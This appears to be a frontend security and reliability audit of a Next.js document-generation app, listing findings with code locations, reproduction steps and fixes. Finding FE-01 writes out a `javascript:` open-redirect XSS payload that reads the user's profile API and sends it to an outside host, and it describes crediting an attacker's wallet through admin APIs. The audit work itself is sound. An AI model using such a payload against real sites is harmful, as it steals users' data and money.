### FE-01 — `?returnTo=` is passed unvalidated to `router.push` after login → open redirect and DOM XSS (`javascript:` URL)
- **Severity:** P0 (precondition: victim opens a crafted link while logged out in that browser and completes the normal Telegram login; admin victim → wallet top-ups = money loss)
- **Location:** `components/home/HomeFiles.tsx:30-33`, `components/overlays/LoginModal.tsx:39-44`, `lib/ui.ts:26-30`; sink is Next 15.5.23 `node_modules/next/dist/client/components/app-router.js:270-277` (`location.assign(canonicalUrl)`) reached via `router-reducer/reducers/navigate-reducer.js:44-50,162-163` (`handleExternalUrl`)
- **Evidence:** `HomeFiles` reads the query string and stores it verbatim: `const ret = params.get("returnTo"); if (ret && sessionChecked && !loggedIn) open("login", { returnTo: ret });`. After any successful login `LoginModal` does `if (returnTo) router.push(returnTo);`. No code anywhere validates `returnTo` (grep: no server or client check). In Next 15.5.23, `router.push(href)` builds `new URL(href, location.href)`; for `javascript:…` or `https://evil…` the origin differs, so the reducer sets `mpaNavigation` and `AppRouter` executes `location.assign(canonicalUrl)`. The router has no `javascript:` guard (only `next/form` has one, `client/form-shared.js:146`). The site CSP is `script-src 'self' 'unsafe-inline'` (`next.config.ts:47`), and `unsafe-inline` allows `javascript:` URL execution. So the payload runs in the app origin with the victim's fresh session cookie. From there it can call any same-origin API: `POST /api/generations` (spend the victim's credits), `GET /api/users/me` (name, phone, ledger), `DELETE /api/generations/:id`, `DELETE /api/auth/session?all=1`. If the victim is an admin it can call `PATCH /api/admin/users/:id {wallet:"balance",delta:…}` (`app/api/admin/users/[id]/route.ts:33`) to credit the attacker, which is direct money loss. Exfiltration works despite `connect-src 'self'` by setting `location = "https://evil/?d=" + data`. With a plain `https://` value the same code is an open redirect straight after a trusted login, which makes a convincing phishing page.
- **Reproduction:** (1) In a browser with no session, open `https://<host>/uz?returnTo=javascript:fetch('/api/users/me').then(r=>r.text()).then(t=>location='https://example.org/?'+encodeURIComponent(t))`. (2) The login modal opens automatically; log in via Telegram (or with dev OTP locally, `features.devLogin`). (3) On `finish()` the page navigates to example.org carrying the `/api/users/me` JSON. Redirect variant: `returnTo=https://example.org`. Unit sketch (jsdom, `tests/ui/`): render `LoginModal` with `useUi.setState({overlay:"login", returnTo:"javascript:alert(1)"})`, mock `useRouter().push`, trigger `onDone`, and assert that `push` was called with a non-relative URL. It is called today.
- **Proposed fix:** Add `safeReturnTo(v: string | null): string | null` in `lib/ui.ts` and apply it in `useUi.open` and again right before `router.push` in `LoginModal`. Accept only same-origin relative paths: `/^\/(?!\/|\\)/.test(v)`, then `new URL(v, location.origin).origin === location.origin`, otherwise `null`. Optionally allow only the `/uz/` prefix. Longer term, drop `'unsafe-inline'` from `script-src` (nonce middleware) so a `javascript:` sink cannot execute even if one slips through.
- **Effort:** S
- **Confidence:** high. The code path is read end to end in the app and in the installed Next router. A 30-second manual run with dev OTP login would confirm browser execution.

### FE-02 — Result page freezes silently when polling gives up (20-min cap, ~30 s outage, any 4xx): the error is only rendered for COMPLETED jobs
- **Severity:** P1 (fails at the target load. Throughput is roughly 0.4–1 job/min (`WORKER_CONCURRENCY=2` × 2–5 min per job), so any sustained arrival rate above that builds a backlog whose wait exceeds 20 min, and every waiting user's page freezes. It also fails after any web outage longer than ~30 s, at any load.)
- **Location:** `lib/api-client.ts:367-408` (`pollGeneration`), `components/files/ResultView.tsx:62-86` (catch → `setError`), `components/files/ResultView.tsx:412` and `:428` (`{running ? <RunningPanel/> : null}` / `{error && completed ? … : null}`), `components/files/ResultView.tsx:557-590` (`RunningPanel` has no error slot)
- **Evidence:** `pollGeneration` throws in three cases: (a) `Date.now() > deadline` with `deadline = Date.now() + 20 * 60_000`, counted from page open and not from job start; (b) more than 5 consecutive network/5xx errors, whose back-off waits total 2+4+6+8+10 = 30 s, so any web outage longer than ~30 s (a `docker compose up -d --build web` deploy, OOM restart, nginx 502) kills every open poll; (c) any other non-OK status such as 429, 404 or 400, which gets no retry at all. `ResultView` stores the message with `setError(e.message)` and stops. While `gen.status` is still `QUEUED`/`IN_PROGRESS` the page renders `RunningPanel`, and the only error UI is gated on `error && completed`. The user therefore sees a progress bar frozen at its last value and the text «Sahifani yopsangiz ham ish davom etadi…», with no message and no further updates, even after the job finishes. Queue math behind the severity: `WORKER_CONCURRENCY=2`, per-job budget up to 660 s (`lib/server/env.ts:91`), and a stale job is retried once (`lib/server/jobs.ts:492-505`). A burst of about 10 heavy jobs, or one job reclaimed after a worker crash, already pushes past 20 min. People who see a frozen screen after paying tend to submit again, and each new submit is a new paid job.
- **Reproduction:** jsdom test: stub `fetch` for `/api/generations/:id` to always return `{generation:{status:"QUEUED",…}}`, fake timers, render `<ResultView id=…/>`, advance 20 min + 1 s, and assert that some text containing «uzoq davom etmoqda» is visible. It is not visible today; `RunningPanel` is still shown and no further fetches happen. Outage variant: return 502 six times in a row and assert the same.
- **Proposed fix:** In `ResultView`, render `error` inside or under `RunningPanel` when `running` (for example «Holat yangilanmay qoldi — [Qayta tekshirish]»), with a button that restarts the effect (bump a `pollKey` state). In `pollGeneration`, replace the hard 20-min throw with a slow mode (poll every 30–60 s once 20 min have passed), treat 429/502/503/504 like network errors (honour `Retry-After`), and resume immediately on `visibilitychange`→visible and `online`.
- **Effort:** S
- **Confidence:** high (read end to end). Queue wait > 20 min at target load comes from the queue settings; the scalability auditor should confirm the exact wait.

### FE-03 — Viewer editor loses ALL unsaved edits when a save fails; the server rejects more than 50 queued ops, so a long editing session always fails
- **Severity:** P1 (deterministic loss of user work in a common flow: every editable viewer, including slide, resume, article, essay, work and teacher)
- **Location:** `components/files/useDocEdit.ts:318-358` (`save`, catch branch `:334-341`), `:364-394` (`push`: unbounded `queueRef.current.push(...ops)`), `:279-291` (`reload`); server cap `lib/server/edit-adapters.ts:225,236-243` (`MAX_EDIT_OPS = 50`) and `lib/server/slide-commit.ts:57,303` (`DOC_PATCH_MAX_BYTES = 300 KB`)
- **Evidence:** Autosave was removed on purpose; edits pile up in `queueRef` and `save()` sends the whole queue in one PATCH (`patchGenerationDoc(genId, versionRef.current, ops)`). The queue has no size limit and no coalescing. Each committed text box, list edit, font-size click, and each undo/redo (which pushes inverse ops) adds entries. The server rejects any PATCH with more than 50 ops (`if (raw.length > MAX_EDIT_OPS) return { ok:false, error:"Bir so'rovda 50 tadan ortiq operatsiya bo'lmaydi" }`) or a body over 300 KB. On any error the client does `queueRef.current = []; setPending(0); await reload();`. Edit 51 things on a 20-slide deck or a 40-page coursework, press «Saqlash», and everything is thrown away and replaced by the server copy; `beforeunload` protection also disappears because `pending` becomes 0. The same wipe happens for transient failures: a network drop (status 0), a 5xx or a 502 during deploy, and even 429 «Juda tez-tez — biroz kuting va qaytadan urinib ko'ring», where the message invites a retry of edits that no longer exist. Second failure mode: if `reload()` also fails (still offline), its catch leaves the optimistic doc on screen while the queue is already empty. The screen then shows content that is not saved, «Saqlash» is gone, and «Yuklab olish» delivers a file without those edits, which breaks the core «ko'rdim = oldim» promise. Third failure mode: a 401 during save (session revoked through «logout all», 30-day expiry, or a block) triggers `onUnauthorized`, and `ResultView` then replaces the viewer with «Kirish talab qilinadi». That unmounts the editor, and its in-memory queue is gone for good.
- **Reproduction:** Extend `tests/ui/slide-viewer-edit.test.mts`: render `SlideViewer` with an editable COMPLETED gen, fire 51 text commits (dblclick → type → Enter), stub `PATCH …/doc` to mimic the server (`ops.length > 50 → 400`), click «Saqlash», and assert the edited text is still on screen and `pending` is 51. Today the text reverts and `pending` is 0. Second test: the PATCH rejects with `TypeError` (offline) and `GET /api/generations/:id` rejects as well; assert that «Saqlash» is still offered. Today it is not, and the unsaved text stays on screen.
- **Proposed fix:** In `useDocEdit.save`: (1) send the queue in chunks of at most `MAX_EDIT_OPS` (each chunk gets the new `docVersion` from the previous response), or coalesce consecutive ops on the same `src`/`path` before sending; (2) keep the queue on network/5xx/429/413 errors and discard it only on 409 `version`/`status` or 422; (3) when `reload()` fails, restore `queueRef`/`pending` so the page still shows «Saqlash» and the `beforeunload` guard stays active. Export `MAX_EDIT_OPS` from a shared (non-server) module so the client and server cannot drift apart.
- **Effort:** M
- **Confidence:** high (client and server code both read; the 50-op envelope check runs before any DB access)

### FE-04 — Any transient failure of `GET /api/auth/session` logs the user out in the UI mid-session (document disappears, login modal pops)
- **Severity:** P2 (becomes frequent under load: DB pool saturation, a 5xx or a network blip on any of the 6 call sites)
- **Location:** `lib/store.ts:117-126` (`refreshSession` catch), callers `components/files/ResultView.tsx:78` (after every poll completes), `:123`, `components/forms/runGeneration.ts:41,50` (right after a paid enqueue), `components/home/HomeFiles.tsx:51`, `components/purchase/PurchasePage.tsx:47`, `components/providers.tsx:20`
- **Evidence:** `refreshSession: async () => { try { … } catch { set({ sessionChecked: true, loggedIn: false, user: null }); } }`. The catch runs for network errors and for any 5xx (`request()` throws `ApiError` for non-OK), and `optionalUser` behind `GET /api/auth/session` queries Postgres (`app/api/auth/session/route.ts:10-11`). One failed call flips a still-valid session to "logged out" in the whole UI. `ResultView` then returns `<Empty title="Kirish talab qilinadi"/>` (`ResultView.tsx:210-213`), which replaces the document the user just waited for. `ToolWorkspace` opens the login modal (`ToolWorkspace.tsx:85-89`). `runGeneration` calls `refreshSession()` immediately after charging, so a blip there sends the user from the paid submit straight to "login required" instead of the progress page. Nothing retries (the comment says «qayta urinish mumkin» but no code does it). The only recovery is a manual reload. During a full outage or deploy (nginx 502), every page load of a logged-in user shows the login modal instead of a «server unavailable» message, which invites pointless re-logins. The next call (`createLoginTicket`) then fails as well.
- **Reproduction:** jsdom: render `<Providers><ResultView id=…/></Providers>` with `fetch` stubbed so `/api/auth/session` first returns a user and the generation poll returns COMPLETED, then make the next `/api/auth/session` call (triggered by `.then(refreshSession)`) return 500. Assert the document is still shown. Today «Kirish talab qilinadi» is rendered.
- **Proposed fix:** In `refreshSession`, only clear the user on a definitive answer (`200` with `user: null`, or 401). On network/5xx/429 keep the current `user`/`loggedIn` and schedule a retry with back-off. On the first load, keep `sessionChecked=false` and show a retry banner instead of the logged-out UI.
- **Effort:** S
- **Confidence:** high

### FE-05 — The global `/api/:path*` → `Cache-Control: private, no-store` overrides the immutable caching of every image, thumbnail, photo and audio asset, so each view re-reads BYTEA blobs from Postgres
- **Severity:** P2 (load amplifier on the DB and on mobile data; grows with the target load)
- **Location:** `next.config.ts:107-110` (`source: "/api/:path*"`, `Cache-Control: private, no-store`); intended headers that get dropped: `app/api/generations/[id]/assets/[assetId]/route.ts:29` (`private, max-age=86400, immutable`), `app/api/generations/[id]/thumb/route.ts:27`, `app/api/uploads/photo/[assetId]/route.ts:25`, `app/api/o/[token]/audio/[assetId]/route.ts:48` (`public, max-age=86400, immutable`); precedence rule `node_modules/next/dist/server/send-response.js:47-52` («only append the header if it is … not present»), the same mechanism the team already hit for the thumb CSP (`next.config.ts:111-123` comment); blob source `lib/server/assets.ts:225-237` (`SELECT a.bytes … FROM generation_assets`)
- **Evidence:** Next applies `next.config` `headers()` to `res` before the route runs, and `sendResponse` skips any Response header that is already present. So in production every asset response carries `private, no-store`, and the route's `max-age=86400, immutable` never reaches the browser. The client uses these URLs everywhere: slide images in `SlideCanvas` (stage + two rails), home cards (`FilePreview` slide preview, `/thumb` JPEGs), article/work figures, resume photos. Every return to `/uz` and every open of a deck re-downloads every image. Each download is a `requireUser` session query plus a full BYTEA read from Postgres through the single Node process. A 20-slide deck is about 20 × 200–400 KB per open; 100 home cards are up to 100 more requests per visit. At 2 000 active users that is hundreds of blob reads per second that browser caching would otherwise absorb, on a shared VPS. Related (file-processing): `getOrBuildThumb` does not cache failures, so a card whose thumbnail cannot be built re-runs LibreOffice (2–8 s) on every visit.
- **Reproduction:** `next start`, open a deck, and in DevTools → Network the image responses show `cache-control: private, no-store`. Navigate away and back: every image is fetched again (200, no «memory/disk cache»). Or run `curl -sI -b <cookie> /api/generations/<id>/assets/<assetId> | grep -i cache-control`.
- **Proposed fix:** Narrow the no-store rule with `missing`/negative matching, or add explicit rules after it for `/api/generations/:id/assets/:assetId`, `/api/generations/:id/thumb`, `/api/uploads/photo/:assetId`, `/api/o/:token/audio/:assetId` with `private, max-age=86400, immutable`. When two rules set the same key, the later one wins; the existing `/api/generations/:id/file` CSP rule already relies on this. Add a test that runs `next start` headers against these routes. Server: cache thumbnail failures for a few hours.
- **Effort:** S
- **Confidence:** high (Next header precedence read in the installed version; the team already observed the same override for the thumb CSP)

### FE-06 — The submit button re-enables right after a successful paid enqueue, while navigation is still pending; a second click creates and charges a duplicate job
- **Severity:** P2 (user money loss; most likely under load, when the RSC fetch for `/uz/files/[id]` is slow)
- **Location:** `components/forms/ToolWorkspace.tsx:225-233`, `SlideComposer.tsx:175-185`, `ResumeComposer.tsx:267-281`, `ArticleComposer.tsx:377-393`, `WorkComposer.tsx`, `EssayComposer.tsx`, `MediaComposer.tsx`, `GameComposer.tsx`, `InfographicComposer.tsx`, `ImageStudio.tsx`, `TranslationForm.tsx`, `teacher/TeacherComposer.tsx` (all the same pattern); `components/forms/ToolChrome.tsx:66-70` (`disabled={disabled || loading}`); server has no idempotency: `app/api/generations/route.ts:29-34` (only a 5/min burst limit)
- **Evidence:** Every composer does `setLoading(true); try { const id = await runGeneration(...); router.push(`/uz/files/${id}`); } … finally { setLoading(false); }`. `router.push` returns immediately (the navigation runs inside `startTransition`), and `/uz/files/[id]` is dynamic and not prefetched. So React keeps showing the form while the RSC request is in flight, and the `finally` has already re-enabled the button with its label and price back («Yaratish · 4 000 tanga»). From the user's side the click «did nothing», so they click again. `POST /api/generations` charges again in a new transaction; the server has no idempotency key or dedupe on identical `values`, and the burst limit allows 5 per minute.
- **Reproduction:** jsdom: mock `useRouter().push` as a no-op (navigation pending), stub `POST /api/generations` → `{id:"…",price:4000,status:"QUEUED"}`, click submit, await, then assert the button is still `disabled`. Today it is enabled and a second click sends a second POST. Manual check: throttle the network to "Slow 3G" in DevTools, submit, and watch the button re-enable before the page changes.
- **Proposed fix:** In each composer (or once in a shared `useSubmit` hook), reset `loading` only in the `catch` branch, not in `finally`, and additionally guard with a `submittedRef` so a second `submit()` is a no-op until unmount. Server side, accept an `Idempotency-Key` header (a UUID generated when the form mounts) and return the existing job for a repeated key within 10 min.
- **Effort:** S
- **Confidence:** medium. The window is certain; its length depends on navigation latency, which is sub-second normally and seconds under load.

### FE-07 — A double-click defeats the two-step «Rostdan?» confirmation: an accidental double-click permanently deletes a paid document or wipes unsaved edits
- **Severity:** P2 (irreversible user data loss; double-clicking buttons is common among the target audience)
- **Location:** `components/overlays/useConfirmClick.ts:13-30`; users: `components/files/ResultView.tsx:132,393-407` (delete document), `components/home/HomeFiles.tsx:63-73` (same pattern with `confirmId`), `components/files/EditActions.tsx:33` («Asliga qaytarish» discards all unsaved edits), `components/viewers/SlideViewer.tsx:318`, and the «Tozalash» buttons in 8 composers
- **Evidence:** `trigger` arms on the first click and fires on the next click with no minimum delay: `if (armed) { …; action(); return; } setArmed(true);`. React flushes the discrete-event state update before the next click is dispatched, so the second click of a double-click (about 100–250 ms later) already sees `armed === true` and runs `action()`. The hook's comment says it exists so that «tasodifiy bosishda hujjat yo'qolmasin», but a double-click on «O'chirish» sends `DELETE /api/generations/:id` straight away. The server deletes the row and its files through `ON DELETE CASCADE` (`app/api/generations/[id]/route.ts:55-70`), and there is no undo or trash. `HomeFiles.askDelete` has the same flaw. In the editor, a double-click on «Asliga qaytarish» discards the whole unsaved queue and clears the undo stacks.
- **Reproduction:** jsdom (`tests/ui/`): render `ResultView` with a COMPLETED gen, `userEvent.dblClick(screen.getByText("O’chirish"))`, and assert that no `DELETE` fetch was sent. Today one `DELETE` is sent. The same applies to `EditActions` with `pending > 0` and to `dblClick` on «Asliga qaytarish».
- **Proposed fix:** In `useConfirmClick`, record `armedAt = performance.now()` and ignore the confirming click if it arrives within about 600 ms of arming (and ignore `event.detail > 1`). Apply the same guard in `HomeFiles.askDelete`, or move it onto `useConfirmClick`. Optionally add soft-delete or undo for generations.
- **Effort:** S
- **Confidence:** high

### FE-09 — The persisted store rehydrates synchronously before React hydration: `/uz/create` pops the login modal for logged-in users, and dark-theme or non-uz users get a hydration mismatch on every hard load
- **Severity:** P2 (common flow: every hard load of «Yaratish» while logged in; the mismatch is a perf/flash cost)
- **Location:** `lib/store.ts:193-212` (`onRehydrateStorage` mutates `state.hydrated = true`), zustand `node_modules/zustand/esm/middleware.mjs:305-329,470-473` (`toThenable` runs synchronously for `localStorage`; `hydrate()` inside the initializer) and `esm/vanilla.mjs:19` (`initialState = createState(...)`, which is what `useSyncExternalStore` uses as the hydration snapshot, `esm/react.mjs:9`); consumers `components/home/CreateGrid.tsx:16-20`, `components/shell/Sidebar.tsx:36-39`, `components/shell/TopBar.tsx:10-19,33,65`
- **Evidence:** With `localStorage` storage, `persist` rehydrates inside `create()`, so on the client `hydrated === true` and `theme`/`locale` hold the persisted values before the first render. The SSR HTML was rendered with `hydrated:false, theme:"light", locale:"uz"`. (1) `CreateGrid`: `useEffect(() => { if (hydrated && !loggedIn) open("login", { returnTo: "/uz/create" }) })` runs at mount while `loggedIn` is still `false`, because `refreshSession()` has not returned. Every logged-in user who hard-loads `/uz/create` (link from Telegram, refresh, bookmark) gets the login modal, and nothing closes it when the session arrives. `ToolWorkspace` explains and avoids exactly this by gating on `sessionChecked` (`ToolWorkspace.tsx:83-89`). `Sidebar.onToolClick` has the same `hydrated` gate. (2) `CreateGrid` renders «Yuklanmoqda...» on the server and the full grid on the first client render. `TopBar` renders `<Sun>` on the server and `<Moon>` for dark users, plus a different flag for `locale ≠ uz`. React 19 treats these as hydration errors and client-renders from the nearest boundary (the root for the shell), which discards the SSR DOM and logs «Hydration failed…» on each hard navigation.
